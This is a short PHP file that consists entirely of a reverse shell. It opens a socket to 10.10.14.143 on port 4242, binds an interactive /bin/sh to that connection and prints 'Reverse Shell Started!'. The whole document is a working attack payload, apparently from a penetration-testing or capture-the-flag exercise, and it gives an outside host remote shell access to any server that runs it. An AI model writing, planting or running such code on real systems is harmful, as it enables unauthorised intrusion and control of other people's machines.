<?php

    $sock=fsockopen("10.10.14.143",4242);
    $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
    echo "Reverse Shell Started!\n"

?>